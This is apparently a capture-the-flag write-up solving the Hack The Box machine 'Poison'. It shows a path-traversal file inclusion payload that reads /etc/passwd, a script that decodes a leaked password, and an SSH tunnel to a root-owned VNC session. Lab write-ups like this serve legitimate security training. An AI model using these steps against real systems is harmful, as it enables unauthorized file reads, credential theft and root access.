---
title:  "Hackthebox - Poison"
date:   2018-09-14 00:13:12 +0200
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-poison.png" alt="Info Card" %}

## user

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) revealed 2 open ports: SSH on port 22 and an apache web server on port 80:

```bash
# Nmap 7.70 scan initiated Sun Sep  2 11:14:44 2018 as: nmap -sV -sC -oA poison 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up (0.060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  2 11:15:14 2018 -- 1 IP address (1 host up) scanned in 30.22 seconds
```

When opening up `http://10.10.10.84` in the browser, it shows a "Temporary website to test local .php scripts". It further shows the following line:

```bash
Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php
```

Immediately, I thought about LFI (local file inclusion). First, I opened `phpinfo.php` to confirm the functionality. Afterwards, I tried to view `/etc/passwd` by iteratively adding `../` before until it worked with `http://10.10.10.84/browse.php?file=../../../../../etc/passwd`: It is possible to read arbitrary files with the permissions of the apache user.

I opened up the other files that were mentioned: `ini.php` reveals an array containing PHP settings and `info.php` tells us more some details about the server OS. `listfiles.php` shows an array that lists something looking like files in the current directory, as it contains the other filenames we already know, as well as `index.php`. Besides that, it lists one more file: `pwdbackup.txt`. 

When requesting `http://10.10.10.84/browse.php?file=../../../../../etc/passwd`, the following text gets returned:

```bash
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
```

The line below the text looks like base64. This can be confirmed when trying to decode it via commandline with `echo <base64-string> | base64 -d`. No error occurs, however, the result seems to be base64 again...

As the text says something about "encoded 13 times", I wrote the following Python code to decode it as long as no error occurs (I did not trust the given number...):

```python
import base64
import sys

def decode(data):
	return base64.b64decode(data)

def read_content(filename):
	with open(filename, "r") as f:
		return f.read()

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print("Usage: {} <data-file>".format(sys.argv[0]))

	filename = sys.argv[1]
	data = read_content(filename)
	print("Original file content: {}".format(data))

	try:
		iteration = 0
		while True:
			iteration = iteration + 1
			data = decode(data)
			print("Iteration {}: {}".format(iteration, data))
	except:
		print("No more decoding possible")
```

This seemed to do the job of decoding the password - the last result before decoding fails does indeed look like the decoded password: `Charix!2#4%6&8(0`.

Actually, I had everything together to own the user account. I just made a stupid copy paste mistake when trying to log in via SSH as user `charix`. I got an authentication error and assumed that I need to find something else. As it said something about `keyboard-interactive` as authentication method to proceed I researched that term and assumed that I need to enter multiple passwords, although I was wondering why the server did not instruct me which ones to use.

I searched through a bunch of files in order to find the "second password", but nothing sounded promising.

Afterwards, I thought about somehow getting command execution and finally a reverse shell. Therefore, I tested some PHP extensions.

First, I wrote a Python script that reads files, uses `php://filter` to convert files to base64 and uses `php://input` to store files on the box. Getting base64 output worked, but I could not upload PHP code. I tried executing php code through log pollution by generating invalid URL which get logged to `var/log/httpd-access.log` but didn't have success either. `/proc/self/environ` was not exposed, and finding the right file descriptor in `/proc/self/fd` sounded too much effort. Log pollution should have worked, for a working approach see [Ippsec's youtube video](https://www.youtube.com/watch?v=rs4zEwONzzk), where he shows a super interesting exploit which uses the file upload functionality, knowing the location where uploads are temporarily stored, being able to include those files and a timing issue to even get a reverse shell.  

Getting desperate, I tried to login once more again via SSH - and it worked! I could login as charix and read `/home/charix/user.txt`.


## root

First, I listed all files in the home directory of `charix`:

```bash
charix@Poison:~ % ls -al
total 48
drwxr-x---  2 charix  charix   512 Mar 19 17:16 .
drwxr-xr-x  3 root    wheel    512 Mar 19 16:08 ..
-rw-r-----  1 charix  charix  1041 Mar 19 17:16 .cshrc
-rw-rw----  1 charix  charix     0 Mar 19 17:17 .history
-rw-r-----  1 charix  charix   254 Mar 19 16:08 .login
-rw-r-----  1 charix  charix   163 Mar 19 16:08 .login_conf
-rw-r-----  1 charix  charix   379 Mar 19 16:08 .mail_aliases
-rw-r-----  1 charix  charix   336 Mar 19 16:08 .mailrc
-rw-r-----  1 charix  charix   802 Mar 19 16:08 .profile
-rw-r-----  1 charix  charix   281 Mar 19 16:08 .rhosts
-rw-r-----  1 charix  charix   849 Mar 19 16:08 .shrc
-rw-r-----  1 root    charix   166 Mar 19 16:35 secret.zip
-rw-r-----  1 root    charix    33 Mar 19 16:11 user.txt
```

There was a zip file with an interesting name:

```bash
charix@Poison:~ % file secret.zip
secret.zip: Zip archive data, at least v2.0 to extract
```

Let's try to unzip it:

```bash
charix@Poison:~ % unzip secret.zip
Archive:  secret.zip
 extracting: secret |
unzip: Passphrase required for this entry
```

Unzipping the file requires a password, but `unzip` on the FreeBSD machine does not have an option for unzipping a file with a password (verified by `man unzip`).

Therefore, I transferred the `secret.zip` file to my own machine:

```bash
$ scp root@10.10.10.84:~/secret.zip .
Password for charix@Poison:	
secret.zip
```

There, I managed to unzip the secret file with the login password of charix:

```bash
$ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
 extracting: secret
```

I got something that looked like a password, but I had no clue how to use it.

After looking around a bit on the machine, I checked all running processes.  Interestingly, there was a VNC server running as root:

```bash
charix@Poison:~ % ps aux | grep vnc
root     529   0.0  0.9  23620  9104 v0- I    23:13    0:01.28 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.v
charix   720   0.0  0.9  24740  8808  2- I    23:14    0:00.37 Xvnc :2 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /home/charix/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /
charix 22599   0.0  0.8  22692  8004  2- I    23:23    0:00.03 Xvnc :3 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /home/charix/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /
charix  6515   0.0  0.0    412   328 13  R+   23:48    0:00.00 grep vnc
```

In order to find out on which port this server listens, I used `sockstat`. Obviously, the VNC server runs on Port 5901 and 5801:

```bash
charix@Poison:~ % sockstat -4 -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
charix   Xvnc       966   0  tcp4   *:6002                *:*
charix   Xvnc       966   3  tcp4   *:5902                *:*
charix   Xvnc       966   4  tcp4   *:5802                *:*
www      httpd      774   4  tcp4   *:80                  *:*
www      httpd      773   4  tcp4   *:80                  *:*
www      httpd      772   4  tcp4   *:80                  *:*
www      httpd      769   4  tcp4   *:80                  *:*
www      httpd      767   4  tcp4   *:80                  *:*
www      httpd      766   4  tcp4   *:80                  *:*
www      httpd      760   4  tcp4   *:80                  *:*
root     sendmail   696   3  tcp4   127.0.0.1:25          *:*
www      httpd      694   4  tcp4   *:80                  *:*
www      httpd      693   4  tcp4   *:80                  *:*
www      httpd      690   4  tcp4   *:80                  *:*
root     httpd      672   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
```

The VNC server only runs locally, but I only had a shell on the server, therefore, I searhced for possibilites to tunnel VNC. I found out that it is possible to tunnel VNC connections via SSH, which perfectly fits my use-case.

On my local machine, I had to issue the following command to establish an SSH tunnel:

```bash
$ ssh -N -L 5901:localhost:5901 charix@10.10.10.84
```

Afterwards, it was possible to connect to the VNC session using `vncviewer`. First, I was not sure about the credentials. Then, I remembered the mysterious credentials from the zip file, which actually seemed to work. Using the following command, I was able to get a VNC session as user `root`:

```bash
$ vncviewer -passwd secret 127.0.0.1:5901
```

This made it possible to open `/root/root.txt` in `xterm`. Copy-pasting from the VNC session did not work. Therefore, I copied the file to a folder which `charix` can access and modified permissions and ownership accordingly. After I opened that file via an SSH session as `charix`, I deleted it to not leave spoilers for other people.
